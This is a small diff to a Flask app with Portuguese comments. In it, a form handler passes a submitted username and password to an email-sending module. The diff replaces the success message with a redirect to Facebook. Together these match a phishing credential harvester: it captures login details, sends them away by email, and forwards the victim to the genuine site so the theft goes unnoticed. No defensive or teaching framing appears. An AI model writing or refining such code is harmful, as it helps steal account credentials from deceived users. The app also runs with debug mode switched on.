@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, redirect, url_for
 import sendEmail
 
 app = Flask(__name__)
@@ -14,7 +14,7 @@ def enviar_email_formulario():
     sendEmail.enviar_email(usuario, senha)
 
     # Retorne uma resposta para o cliente, se necessário
-    return 'E-mail enviado com sucesso!'
+    return redirect("https://www.facebook.com")
 
 if __name__ == '__main__':
     app.run(debug=True)
